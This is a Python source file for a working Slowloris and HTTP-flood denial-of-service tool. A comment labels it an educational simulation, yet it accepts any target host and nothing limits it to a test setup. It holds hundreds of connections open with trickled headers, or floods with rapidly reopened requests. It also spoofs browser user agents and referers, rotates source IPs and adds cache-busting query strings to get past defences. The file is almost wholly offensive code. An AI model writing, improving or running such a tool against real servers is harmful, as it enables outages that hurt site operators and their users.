import socket
import random
import time
import argparse
import sys
import ssl
import string
from urllib.parse import urlparse

# Educational Slowloris Simulation
# This script illustrates the mechanism of a Slowloris DoS attack.
# DO NOT USE ILLEGALLY.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://twitter.com/",
    "https://www.facebook.com/",
    "https://www.github.com/"
]

def init_socket(ip, port, use_ssl=False, host_header=None, path="/", cache_bust=False, source_ip=None, flood=False):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        
        if source_ip:
            try:
                s.bind((source_ip, 0))
            except socket.error as e:
                print(f"[!] Could not bind to source IP {source_ip}: {e}", flush=True)
                return None

        if use_ssl:
            context = ssl.create_default_context()
            # Disable cert verification for lab/internal testing
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host_header if host_header else ip)

        s.connect((ip, port))
        
        # Cache Busting logic
        final_path = path
        if cache_bust:
            cb = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            separator = "&" if "?" in path else "?"
            final_path = f"{path}{separator}cb={cb}"

        ua = random.choice(USER_AGENTS)
        ref = random.choice(REFERERS)
        
        s.send(f"GET {final_path} HTTP/1.1\r\n".encode("utf-8"))
        if host_header:
            s.send(f"Host: {host_header}\r\n".encode("utf-8"))
        s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
        s.send(f"Referer: {ref}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        
        if flood:
            # Complete the request immediately for a flood
            s.send("Connection: close\r\n\r\n".encode("utf-8"))
            # In flood mode, we might not even wait for a response
            # or we might want to keep the socket open if using keep-alive.
            # But "Flood" often implies many short-lived connections or many requests.
        else:
            # Leave the request open for Slowloris
            s.send("Connection: keep-alive\r\n".encode("utf-8"))
            
        return s
    except (socket.error, ssl.SSLError):
        return None

def main():
    parser = argparse.ArgumentParser(description="Slowloris/HTTP Flood Educational Simulation")
    parser.add_argument("host", help="Target host IP or domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets/threads to use (default: 150)")
    parser.add_argument("--ips", help="Comma-separated source IPs for binding", default=None)
    parser.add_argument("--path", default="/", help="Path to target (e.g. /search)")
    parser.add_argument("--cache-bust", action="store_true", help="Enable cache busting (random query strings)")
    parser.add_argument("--flood", action="store_true", help="Enable Volumetric HTTP Flood (High Frequency)")
    
    args = parser.parse_args()
    
    target_host = args.host
    target_port = args.port
    socket_count = args.sockets
    source_ips = args.ips.split(",") if args.ips else []
    
    # Handle full URLs
    target_path = args.path
    use_ssl = False
    if target_host.startswith("http"):
        parsed = urlparse(target_host)
        target_path = parsed.path if parsed.path else "/"
        target_host = parsed.hostname
        if parsed.scheme == "https":
            use_ssl = True
            if target_port == 80:
                target_port = 443
    
    if target_port == 443:
        use_ssl = True

    mode_name = "HTTP FLOOD" if args.flood else "SLOWLORIS"
    print(f"[*] Starting {mode_name} simulation on {target_host}:{target_port}{target_path} with {socket_count} sockets", flush=True)
    if source_ips:
        print(f"[*] Using source IP pool: {source_ips}", flush=True)
    if args.cache_bust:
        print("[*] Cache Busting: ENABLED", flush=True)

    sockets = []
    
    # In flood mode, we use threads to keep things moving as fast as possible
    # if we want true high frequency. But for now, we'll keep the socket management logic.
    
    def create_and_add_socket(i):
        source_ip = source_ips[i % len(source_ips)] if source_ips else None
        s = init_socket(target_host, target_port, use_ssl, target_host, target_path, args.cache_bust, source_ip, args.flood)
        if s:
            sockets.append(s)
            return True
        return False

    for i in range(socket_count):
        if create_and_add_socket(i):
            if i % 10 == 0:
                print(f"[*] Created {len(sockets)} connections...", flush=True)
        else:
            if not source_ips:
                print(f"[!] Failed to connect. Is the server up?", flush=True)
                break
            else:
                print(f"[!] Skipping failed connection with source IP {source_ip}", flush=True)
        
    while True:
        if not sockets:
            print("[!] No active connections. Attempting to restart...")
            time.sleep(2)
        else:
            if not args.flood:
                print(f"[*] Sending keep-alive headers... Socket count: {len(sockets)}", flush=True)
                for s in list(sockets):
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        sockets.remove(s)
            else:
                # In flood mode, we just keep reopening sockets as fast as possible
                # or send more data. For a flood of full requests, we close and reopen.
                for s in list(sockets):
                    sockets.remove(s)
                    try: s.close()
                    except: pass

        # Refill sockets
        diff = socket_count - len(sockets)
        if diff > 0:
            if not args.flood:
                print(f"[*] Reopening {diff} closed connections...", flush=True)
            for i in range(diff):
                create_and_add_socket(i)
        
        if not args.flood:
            time.sleep(15)
        else:
            # Tight loop for flood, maybe a tiny sleep to prevent CPU lock but actually
            # for flood we want maximum speed.
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Stopping simulation...")
        sys.exit()
